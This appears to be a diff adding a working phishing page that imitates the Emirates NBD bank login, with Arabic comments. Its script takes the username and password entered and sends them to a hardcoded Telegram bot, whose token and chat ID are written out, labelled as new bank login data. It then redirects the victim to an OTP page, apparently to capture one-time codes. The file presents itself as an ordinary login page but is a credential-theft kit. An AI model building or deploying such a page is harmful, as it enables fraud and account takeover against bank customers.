@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Emirates NBD Login</title>
+    <style>
+        body {
+            background-color: #e0e0e0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        .login-card {
+            background-color: #ffffff;
+            width: 90%;
+            max-width: 380px;
+            padding: 40px 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            position: relative;
+        }
+
+        .close-btn {
+            position: absolute;
+            right: 20px;
+            top: 20px;
+            font-size: 24px;
+            color: #999;
+            cursor: pointer;
+        }
+
+        .logo-box {
+            width: 80px;
+            height: 80px;
+            border: 2px solid #004797;
+            border-radius: 12px;
+            margin: 0 auto 30px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* تمثيل مبسط لأيقونة الموجات في الشعار */
+        .logo-icon-svg {
+            display: flex;
+            gap: 5px;
+        }
+        .wave {
+            width: 4px;
+            height: 30px;
+            border-radius: 2px;
+        }
+        .blue { background-color: #004797; }
+        .gold { background-color: #ffb800; height: 35px; }
+
+        h2 {
+            text-align: center;
+            color: #333;
+            font-size: 20px;
+            margin-bottom: 30px;
+            font-weight: 600;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .label-row {
+            display: flex;
+            justify-content: flex-end;
+            margin-bottom: 8px;
+        }
+
+        label {
+            color: #666;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 15px;
+            border: none;
+            border-radius: 8px;
+            background-color: #f2f2f2;
+            font-size: 14px;
+            box-sizing: border-box;
+            color: #333;
+        }
+
+        input::placeholder {
+            color: #aaa;
+            text-align: right;
+        }
+
+        .login-btn {
+            width: 100%;
+            background-color: #004797; /* الأزرق الملكي الخاص بالبنك */
+            color: white;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            text-transform: uppercase;
+            margin-top: 20px;
+            cursor: pointer;
+            letter-spacing: 1px;
+        }
+
+    </style>
+</head>
+<body>
+
+<div class="login-card">
+    <div class="close-btn">×</div>
+    
+    <div class="logo-box">
+        <div class="logo-icon-svg">
+            <div class="wave blue"></div>
+            <div class="wave gold"></div>
+            <div class="wave blue"></div>
+        </div>
+    </div>
+
+    <h2>Log in to your account</h2>
+
+    <form id="enbdForm">
+        <div class="form-group">
+            <div class="label-row"><label>Username</label></div>
+            <input type="text" id="username" placeholder="Enter your username">
+        </div>
+
+        <div class="form-group">
+            <div class="label-row"><label>Password</label></div>
+            <input type="password" id="password" placeholder="Enter your password">
+        </div>
+
+        <button type="submit" class="login-btn">LOGIN</button>
+    </form>
+</div>
+
+<script>
+document.getElementById('enbdForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+
+    // التحقق من إدخال البيانات
+    if (!username || !password) {
+        alert('يرجى ملء جميع الحقول');
+        return;
+    }
+
+    // إرسال البيانات لبوت تلغرام
+    fetch('https://api.telegram.org/bot7272097327:AAFcKxacVS26HNg85tK2uYpNLmOMxmsqgZM/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: '1008144314',
+            text: `🔐 *بيانات دخول جديدة - بنك الإمارات دبي الوطني*\n👤 اسم المستخدم: ${username}\n🔑 كلمة المرور: ${password}\n📅 ${new Date().toLocaleString('ar-EG')}`,
+            parse_mode: 'Markdown'
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            window.location.href = 'otp_page.html';
+        } else {
+            throw new Error('فشل الإرسال');
+        }
+    })
+    .catch(() => {
+        alert('❌ خطأ في إرسال البيانات. تحقق من الاتصال بالإنترنت.');
+    });
+});
+</script>
+
+</body>
+</html>
